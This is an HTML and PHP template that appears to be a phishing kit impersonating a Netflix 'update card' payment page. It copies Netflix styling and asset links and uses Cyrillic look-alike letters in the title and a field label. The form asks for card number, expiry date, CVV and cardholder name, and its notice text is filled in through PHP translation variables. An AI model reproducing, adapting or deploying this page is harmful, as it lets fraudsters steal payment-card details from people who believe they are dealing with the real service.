...
<html lang="en" class="">
  <head>
    ...
    <title>Nеtflіх</title>
    <link rel="preload" href="./process_files/simpleSignupClient.f19c16f7bd94a792ed64.js.download" as="script">

    <meta content="watch movies, movies online, watch TV, TV online, TV shows online, watch TV shows, stream movies, stream tv, instant streaming, watch online, movies, watch movies تونس, watch TV online, no download, full length movies" name="keywords">
    ...
    <link type="text/css" rel="stylesheet" href="./process_files/simplicity.e916a1b80fefe0c5f0ba.css" data-uia="botLink">
    ...
    <meta property="al:ios:url" content="nflx://www.google.com/search?q=net&signup/creditoption">
    ...
    <style data-rh="true" data-toolkit-style="true" id="input.css#form-control_controlWrapperStyles__oy4jpq1">
      .form-control_controlWrapperStyles__oy4jpq1>.input_nativeElementStyles__1euouia0 {
        min-height: 16px;
        min-width: 16px;
      }

      /*# sourceMappingURL=data:application/json;charset=utf-8;base64, */
    </style>
    <style data-emotion="css" data-s=""></style>
    <style data-package="@nf-web-ui/gx-payments" data-file="src/components/inputSuggestions/inputSuggestions.css.ts" type="text/css">
      .vbyqzc0 {
        position: relative;
      }
    ...
    <style data-package="@nf-web-ui/gx-payments" data-file="src/components/instructionItem/instructionItem.css.ts" type="text/css">
      ._9hpvi80 {
        align-items: center;
        display: flex;
        margin: 32px 0;
    ...
    <style data-emotion="default-ltr-cache bjn8wh" data-s="">
      .default-ltr-cache-bjn8wh {
        position: relative;
      }
    </style>
    <style data-emotion="default-ltr-cache 1kfc69n" data-s="">
      .default-ltr-cache-1kfc69n {
        margin-top: 20px;
        width: 100%;
      }
    </style>
    <style data-emotion="default-ltr-cache qdh73z" data-s="">
      .default-ltr-cache-qdh73z {
        color: inherit;
        width: 100%;
        max-width: 43.125rem;
        font-size: 0.875rem;
      ...
      .default-ltr-cache-qdh73z a:hover {
        -webkit-text-decoration: underline;
        text-decoration: underline;
      }
    </style>
    <style data-emotion="default-ltr-cache invtik" data-s="">
      .default-ltr-cache-invtik {
        font-size: 1.5rem;
        font-weight: 500;
        line-height: 1.25;
        color: inherit;
    ...
    <style data-emotion="default-ltr-cache kg1rox" data-s="">
      .default-ltr-cache-kg1rox {
        max-width: 39px;
        max-height: 25px;
      }
    </style>
    <style data-emotion="default-ltr-cache 1jfz1cn" data-s="">
      .default-ltr-cache-1jfz1cn {
        width: 100%;
      }

      .default-ltr-cache-1jfz1cn .form-control_controlWrapperStyles__oy4jpq1 {
        min-width: 0;
      }

      .default-ltr-cache-1jfz1cn .form-control_controlWrapperStyles__oy4jpq1>input:focus::-webkit-input-placeholder {
        opacity: 1;
      }

      .default-ltr-cache-1jfz1cn .form-control_controlWrapperStyles__oy4jpq1>input:focus::-moz-placeholder {
        opacity: 1;
      }

      .default-ltr-cache-1jfz1cn .form-control_controlWrapperStyles__oy4jpq1>input:focus:-ms-input-placeholder {
        opacity: 1;
      }

      .default-ltr-cache-1jfz1cn .form-control_controlWrapperStyles__oy4jpq1>input:focus::placeholder {
        opacity: 1;
      }

      .default-ltr-cache-1jfz1cn .form-control_controlWrapperStyles__oy4jpq1>input::-webkit-input-placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }

      .default-ltr-cache-1jfz1cn .form-control_controlWrapperStyles__oy4jpq1>input::-moz-placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }

      .default-ltr-cache-1jfz1cn .form-control_controlWrapperStyles__oy4jpq1>input:-ms-input-placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }

      .default-ltr-cache-1jfz1cn .form-control_controlWrapperStyles__oy4jpq1>input::placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }
    </style>
    <style data-emotion="default-ltr-cache pukm6w" data-s="">
      .default-ltr-cache-pukm6w {
        width: 100%;
      }
      ...
      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1 {
        padding: 0;
      }

      .default-ltr-cache-pukm6w input~.form-control_controlChromeStyles__oy4jpq4 {
        border-style: solid;
      }

      .default-ltr-cache-pukm6w input[aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        opacity: 1;
      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input[aria-disabled] {
        cursor: not-allowed;
      }

      .default-ltr-cache-pukm6w .form-control_descriptionStyles__oy4jpq6 {
        width: 100%;
      }

      .default-ltr-cache-pukm6w .form-control_validationMessageStyles__oy4jpq7 {
        fill: currentColor;
        width: 100%;
      }

      .default-ltr-cache-pukm6w .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
      .default-ltr-cache-pukm6w .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
      .default-ltr-cache-pukm6w .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
        position: relative;
      }
      ...
      .default-ltr-cache-pukm6w .form-control_labelStyles__oy4jpq5 {
        position: absolute;
        z-index: 1;
        white-space: nowrap;
        overflow: hidden;
      ...
      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input {
        color: inherit;

      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input:-webkit-autofill {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input:autofill {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input.edge-autofilled,
      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input[data-com-onepassword-filled],
      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input[data-dashlane-autofilled] {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }
      ...
      .default-ltr-cache-pukm6w input:focus:not(:focus-visible)~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
      }

      .default-ltr-cache-pukm6w input:focus~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
        outline: rgb(0, 0, 0) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-pukm6w input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
      ...
      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input {
        ...
        width: 100%;
        padding-top: 1.5rem;
        padding-right: calc(1rem + 1.5rem + 0.5rem);
      ...
      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input:focus::-webkit-input-placeholder {
        opacity: 1;
      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input:focus::-moz-placeholder {
        opacity: 1;
      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input:focus:-ms-input-placeholder {
        opacity: 1;
      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input:focus::placeholder {
        opacity: 1;
      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input::-webkit-input-placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input::-moz-placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input:-ms-input-placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }

      .default-ltr-cache-pukm6w .form-control_controlWrapperStyles__oy4jpq1>input::placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }
    </style>
    <style data-emotion="default-ltr-cache 1ubk3wx" data-s="">
      .default-ltr-cache-1ubk3wx {
        position: absolute;
        pointer-events: none;
        height: 1.5rem;
        left: auto;
      ...
      .default-ltr-cache-1ubk3wx>svg {
        width: 100%;
        height: 100%;
        display: block;
      }

      .default-ltr-cache-1ubk3wx>:not(svg) {
        opacity: 1;
      }
    </style>
    <style data-emotion="default-ltr-cache 1aatv6y" data-s="">
      .default-ltr-cache-1aatv6y {
        height: 1.375rem;
        color: rgb(128, 128, 128);
      }
    </style>
    <style data-emotion="default-ltr-cache 1720sfo" data-s="">
      .default-ltr-cache-1720sfo {
        width: 100%;
      }
      ...
      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1 {
        padding: 0;
      }

      .default-ltr-cache-1720sfo input~.form-control_controlChromeStyles__oy4jpq4 {
        border-style: solid;
      }

      .default-ltr-cache-1720sfo input[aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        opacity: 1;
      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input[aria-disabled] {
        cursor: not-allowed;
      }

      .default-ltr-cache-1720sfo .form-control_descriptionStyles__oy4jpq6 {
        width: 100%;
      }

      .default-ltr-cache-1720sfo .form-control_validationMessageStyles__oy4jpq7 {
        fill: currentColor;
        width: 100%;
      }

      .default-ltr-cache-1720sfo .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
      .default-ltr-cache-1720sfo .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
      .default-ltr-cache-1720sfo .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
        position: relative;
      }
      ...
      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input {
        color: inherit;

      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input:-webkit-autofill {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input:autofill {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input.edge-autofilled,
      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input[data-com-onepassword-filled],
      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input[data-dashlane-autofilled] {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }
      ...
      .default-ltr-cache-1720sfo input:focus:not(:focus-visible)~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
      }

      .default-ltr-cache-1720sfo input:focus~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
        outline: rgb(0, 0, 0) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-1720sfo input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
        background: rgb(225, 229, 245);
      }
      ...
      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input:focus::-webkit-input-placeholder {
        opacity: 1;
      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input:focus::-moz-placeholder {
        opacity: 1;
      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input:focus:-ms-input-placeholder {
        opacity: 1;
      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input:focus::placeholder {
        opacity: 1;
      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input::-webkit-input-placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input::-moz-placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input:-ms-input-placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }

      .default-ltr-cache-1720sfo .form-control_controlWrapperStyles__oy4jpq1>input::placeholder {
        opacity: 0;
        -webkit-transition: '.1s opacity .1s linear';
        transition: '.1s opacity .1s linear';
      }
    </style>
    <style data-emotion="default-ltr-cache 6ngp27" data-s="">
    ...
    <style data-emotion="default-ltr-cache 1071m8g" data-s="">
      .default-ltr-cache-1071m8g {
        border: 0;
        cursor: pointer;
        fill: currentColor;
        position: relative;
      ...
      .default-ltr-cache-1071m8g:focus {
        outline: none;
        outline: rgb(0, 0, 0) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-1071m8g:focus:not(:focus-visible) {
        outline: none;
      }

      .default-ltr-cache-1071m8g::after {
        bottom: 0;
        left: 0;
        position: absolute;
        right: 0;
      ...
      .default-ltr-cache-1071m8g[aria-disabled] {
        opacity: 1;
      ...
      .default-ltr-cache-1071m8g[aria-disabled]::after {
        border-color: rgba(0, 0, 0, 0);
      }

      @media all and (hover: hover) {
        .default-ltr-cache-1071m8g:not([aria-disabled]):hover {
          transition-timing-function: cubic-bezier(0.32, 0.94, 0.6, 1);
          background: rgb(193, 17, 25);
        }

        .default-ltr-cache-1071m8g:not([aria-disabled]):hover::after {
          border-color: rgba(0, 0, 0, 0);
        }
      }

      .default-ltr-cache-1071m8g:not([aria-disabled]):active {
        -webkit-transition: none;
        transition: none;
      ...
      .default-ltr-cache-1071m8g:not([aria-disabled]):active::after {
        border-color: rgba(0, 0, 0, 0);
      }
    </style>
    <style data-emotion="default-ltr-cache 8dk3vg" data-s="">
      .default-ltr-cache-8dk3vg {
        margin-bottom: 1rem;
      }
    </style>
    <style data-emotion="default-ltr-cache 1llkjrq" data-s="">
      .default-ltr-cache-1llkjrq a {
        color: inherit;
        -webkit-text-decoration: underline;
        text-decoration: underline;
      }
    </style>
    <style data-emotion="default-ltr-cache 1kz38kj" data-s="">
      .default-ltr-cache-1kz38kj {
      ...
      .default-ltr-cache-1kz38kj a {
        color: inherit;
        -webkit-text-decoration: underline;
        text-decoration: underline;
      }
    </style>
    <style data-emotion="default-ltr-cache 1m5ksse" data-s="">
      .default-ltr-cache-1m5ksse {
        border-radius: 0.125rem;
      }

      .default-ltr-cache-1m5ksse:focus {
        outline: none;
        outline: rgb(0, 0, 0) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-1m5ksse:focus:not(:focus-visible) {
        outline: none;
      }

      .default-ltr-cache-1m5ksse,
      .default-ltr-cache-1m5ksse:visited {
        color: rgb(29, 99, 196);
      }

      @media all and (hover: hover) {
        .default-ltr-cache-1m5ksse:not([aria-disabled]):hover {
          color: rgb(29, 82, 157);
        }
      }

      .default-ltr-cache-1m5ksse:not([aria-disabled]):active {
        color: rgb(28, 64, 114);
      }

      .default-ltr-cache-1m5ksse[aria-disabled] {
        color: rgb(68, 142, 244);
      }
    </style>
    <style data-emotion="default-ltr-cache km743h" data-s="">
      .default-ltr-cache-km743h {
        opacity: 0;
        visibility: hidden;
    ...
    <style data-emotion="default-ltr-cache vz5e2x" data-s="">
      .default-ltr-cache-vz5e2x a {
        color: rgb(29, 99, 196);
        -webkit-text-decoration: underline;
        text-decoration: underline;
      }
    </style>
    <style data-emotion="default-ltr-cache 1gzfkc9" data-s="">
      .default-ltr-cache-1gzfkc9 {
        margin-block-start: 0;
        margin-block-end: 0;
        margin: 0;
        padding: 0;
      ...
      <div>
        <div class="netflix-sans-font-loaded">
          <div data-uia="loc" lang="en-TN" dir="ltr">
            <div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-creditOptionMode simplicity" lang="en-TN" dir="ltr">
              <div class="nfHeader noBorderHeader signupBasicHeader onboarding-header">
                <a href="https://www.google.com/search?q=net&" class="svg-nfLogo signupBasicHeader onboarding-header" data-uia="netflix-header-svg-logo">
...
;
  ...
  <div class="nf-message-container" data-uia="UIMessage+container">
    <div class=" default-ltr-cache-1puvbbc e191g6e33" role="alert" data-uia="UIMessage-content">
      <div class="default-ltr-cache-1x17g94 e191g6e32">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="24" height="24" data-icon="WarningFillStandard" data-uia="UIMessage-content+icon" aria-hidden="true" class="default-ltr-cache-ceu2i e191g6e36">
...
<span id="" data-uia=""><?php echo $translations['validCardEntry']; ?></span>
        </div>
      </div>
    </div>
  </div>
                        ...
                        <div>
                          <div role="status" class="default-ltr-cache-1kfc69n e1qjuwtr0">

                            <h1 data-uia="stepTitle" class="default-ltr-cache-invtik e1gdp3hr2"><?php echo $translations['updateCard']; ?></h1>
                          </div>
                        </div>
<style>
...
.silvercard label {
    ...
    left: 1rem;
    transform: translateY(-50%);
    transition: all 0.3s ease; /* Smooth transition for movement and font-size change */
    color: rgba(0, 0, 0, 0.7);
...
.silvercard input:not(:placeholder-shown) + label,
.silvercard input:focus + label {
    font-size: 0.75rem;
    top: 2.5rem;
}
...
.form-control_containerStyles__oy4jpq0 label {
    transition: all 0.3s ease;
    font-size: 1rem;
    top: 3rem;
    position: relative; /* ensure that 'top' has an effect */
}

/* Styles when the input is active or has content */
.form-control_containerStyles__oy4jpq0 label.active {
    font-size: 0.75rem;
    top: 2rem;
}
...
document.addEventListener("DOMContentLoaded", function() {
    ...
    inputs.forEach(function(input) {
        ...
        // Initial check in case there's already text in the input (e.g., autofill)
        updateLabel();
    });
});
...
.silverexp input:not(:placeholder-shown) + label,
.silverexp input:focus + label {
    font-size: 0.75rem;
    top: 2.5rem;
}
...
<script>
document.addEventListener("DOMContentLoaded", function() {
    const inputs = document.querySelectorAll('.silverexp [name="creditExpirationMonth"], .silverexp [name="creditCardSecurityCode"]');
    inputs.forEach(function(input) {
        const label = input.closest('.form-control_containerStyles__oy4jpq0').querySelector('label');
...
function updateLogo(cardType) {
    var logoElement = document.querySelector('.default-ltr-cache-1ubk3wx.e1vkmu651');
    switch (cardType) {
        case 'VISA':
            logoElement.innerHTML = '<img src="logo/VISA.png" alt="Visa Logo" width="40" height="24">';
            break;
        case 'MASTERCARD':
            logoElement.innerHTML = '<img src="logo/MASTERCARD.png" alt="MasterCard Logo" width="40" height="24">';
            break;
        case 'AMEX':
            logoElement.innerHTML = '<img src="logo/AMEX.png" alt="American Express Logo" width="40" height="24">';
            break;
        case 'DINERS':
            logoElement.innerHTML = '<img src="logo/DINERS.png" alt="Diners Club Logo" width="40" height="24">';
            break;
        case 'UNIONPAY':
            logoElement.innerHTML = '<img src="logo/UNIONPAY.png" alt="UnionPay Logo" width="40" height="24">';
            break;
        default:
            // Reset to default SVG if no card type is matched
            logoElement.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="40" height="24" data-icon="CreditCardStandard" aria-hidden="true" class="default-ltr-cache-1aatv6y e1hwh5ed0">
...
.newCustomClass {
  background: rgb(255, 255, 255);
  border-radius: 0.25rem;
  border: 0.0625rem solid rgb(128, 128, 128); /* Combined border properties */
}
...
input:focus ~ .newCustomClass,
select:focus ~ .newCustomClass {
  outline: 1.5px solid black; /* Thicker black outline on focus */
  box-shadow: 0 0 0 3px rgba(0,0,0,0.2); /* Adding shadow for a glowing effect */
}

input:focus:not(:focus-visible) ~ .newCustomClass,
select:focus:not(:focus-visible) ~ .newCustomClass {
  outline: none;
}
</style>

<style>
        .form-control_validationMessageStyles__oy4jpq7 {
            font-size: 0.8125rem;
            font-weight: 400;
            margin-top: 0.375rem;
            color: rgb(193, 17, 25);
        ...
        .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
        .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
        .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
            margin-right: 0.25rem;
            top: 0.1875rem;
            position: relative;
        }
        path[Attributes Style] {
            fill-rule: evenodd;
            clip-rule: evenodd;
            d: path("M 14.5 8 C 14.5 11.5899 11.5899 14.5 8 14.5 C 4.41015 14.5 1.5 11.5899 1.5 8 C 1.5 4.41015 4.41015 1.5 8 1.5 C 11.5899 1.5 14.5 4.41015 14.5 8 Z M 16 8 C 16 12.4183 12.4183 16 8 16 C 3.58172 16 0 12.4183 0 8 C 0 3.58172 3.58172 0 8 0 C 12.4183 0 16 3.58172 16 8 Z M 4.46967 5.53033 L 6.93934 8 L 4.46967 10.4697 L 5.53033 11.5303 L 8 9.06066 L 10.4697 11.5303 L 11.5303 10.4697 L 9.06066 8 L 11.5303 5.53033 L 10.4697 4.46967 L 8 6.93934 L 5.53033 4.46967 L 4.46967 5.53033 Z");
            fill: currentcolor;
        }
                        ...
                        <div class="fieldContainer">
                          <span class="logos logos-block" data-uia="cardLogos-comp" aria-label="We accept Visa, Mastercard and American Express.">
                            <img src="./process_files/VISA.png" alt="Visa" class="logoIcon VISA default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA@2x.png 2x" data-uia="logoIcon-VISA">
                            <img src="./process_files/MASTERCARD.png" alt="Mastercard" class="logoIcon MASTERCARD default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD@2x.png 2x" data-uia="logoIcon-MASTERCARD">
					...
					<label dir="ltr" data-uia="field-сreditСardNumbеr+label"><?php echo $translations['cardNumberLabel']; ?></label>
							  ...
							  <div style="display: none;" id="errorcard" class="form-control_validationMessageStyles__oy4jpq7" >
  <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" class="default-ltr-cache-13htjwu e1vkmu653">
    <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
  </svg><?php echo $translations['validCreditCardError']; ?>
</div>
       
                            </li>
                     <li data-uia="field-creditExpirationMonth+wrapper" class="nfFormSpace inline">
							<div class="silverexp">
                              <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-creditExpirationMonth+container" dir="ltr">
                                <label for=":r4:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-creditExpirationMonth+label"><?php echo $translations['expirationDateLabel']; ?></label>
                                <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                  <input type="tel" autocomplete="cc-exp" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="ExpiryDate" name="creditExpirationMonth" data-uia="field-creditExpirationMonth" value="">
                                  <div aria-hidden="true" id="borderexp" class="newCustomClass" dir="ltr"></div>
                                </div>
                              </div>
							   </div>
				<div style="display: none;" id="errorexp" class="form-control_validationMessageStyles__oy4jpq7" >
  <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" class="default-ltr-cache-13htjwu e1vkmu653">
    <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
  </svg><?php echo $translations['enterExpirationDate']; ?>
</div>
                            </li>
                            <li data-uia="field-creditExpirationYear+wrapper" class="nfFormSpace hidden"></li>
                            <li data-uia="field-creditCardSecurityCode+wrapper" class="nfFormSpace inline">
                              <div class="silverexp">
							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-pukm6w e2so2tu1" data-uia="field-creditCardSecurityCode+container" dir="ltr">
                                <label for=":r7:"  dir="ltr" data-uia="field-creditCardSecurityCode+label"><?php echo $translations['cvvLabel']; ?></label>
                                <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                  <input type="tel" autocomplete="cc-csc" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" maxlength="4" id="SecurityCode" name="creditCardSecurityCode" data-uia="field-creditCardSecurityCode" value="">
                                  <div aria-hidden="true" id="bordercvv" class="newCustomClass" dir="ltr"></div>
                                  <div role="img" aria-hidden="true" class="default-ltr-cache-1ubk3wx e1vkmu651">
                                    <button data-uia="cvv-tooltip" class="pressable_styles__a6ynkg0" dir="ltr" type="button">
                                      <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" aria-label="CVV" viewBox="0 0 24 24" width="24" height="24" data-icon="CircleQuestionMarkStandard" pointer-events="all" class="default-ltr-cache-6ngp27 e14aa2bi0">
					  ...
					  <div style="display: none;" id="errorcvv" class="form-control_validationMessageStyles__oy4jpq7" >
  <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" class="default-ltr-cache-13htjwu e1vkmu653">
    <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
  </svg><?php echo $translations['enterCVV']; ?>
</div>
                            </li>
                            <li data-uia="field-firstName+wrapper" class="nfFormSpace">
							  ...
							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['nameOnCardLabel']; ?></label>
                                <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                  <input type="text" autocomplete="cc-name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="NameOnCard" name="firstName" data-uia="field-name" value="">
                                  <div aria-hidden="true" id="bordername" class="newCustomClass" dir="ltr"></div>
                                </div>
                              </div>
							  </div>
	<div style="display: none; margin-bottom: 10px;" id="errorfullname" class="form-control_validationMessageStyles__oy4jpq7" >
  <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" class="default-ltr-cache-13htjwu e1vkmu653">
    <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
  </svg><?php echo $translations['nameIsRequired']; ?>
</div>
                            </li>
                            <li data-uia="field-lastName+wrapper" class="nfFormSpace hidden"></li>
                          </ul>
                          <ul class="orderInfo" data-uia="orderInfo">
                            <li class="orderInfoItem" data-uia="selected-plan-item">
                              <div class="orderInfoItem__content-container">
                                <div class="orderInfoItem__content-defaultLineHeight default-ltr-cache-0" data-uia="selected-plan-item+content">
                                  <div class="orderInfoItem__text orderInfoItem__title" data-uia="selected-plan-item+title">
                                    <bold><?php echo $translations['noticeLabel']; ?></bold>
                                  </div>
                                  <div class="orderInfoItem__text orderInfoItem__description" data-uia="selected-plan-item+description"><?php echo $translations['authorizationNotice']; ?></div>
                                </div>
                              </div>
                            </li>
                          </ul>
                            ...
                            <div class="tou--container" data-uia="tou-container">
                              <div class="tou--container" data-uia="tou-container">
                                <div class="user-consent--container" data-uia="termsOfUseMatlock+organic-rest">
                                  <span id="" data-uia="termsOfUse-Disclosure"><?php echo $translations['agreeToOur']; ?> <a target="_blank" href="#"><?php echo $translations['termsOfUse']; ?></a>, <a target="_blank" href="#"><?php echo $translations['privacyStatement']; ?></a><?php echo $translations['membershipDetails']; ?></span>
                                  <div class="ui-binary-input">
                                    <input type="checkbox" class="" name="hasAcceptedTermsOfUse" id="cb_hasAcceptedTermsOfUse" tabindex="0" data-uia="field-hasAcceptedTermsOfUse" value="true">
                                    <label for="cb_hasAcceptedTermsOfUse" data-uia="field-hasAcceptedTermsOfUse+label">
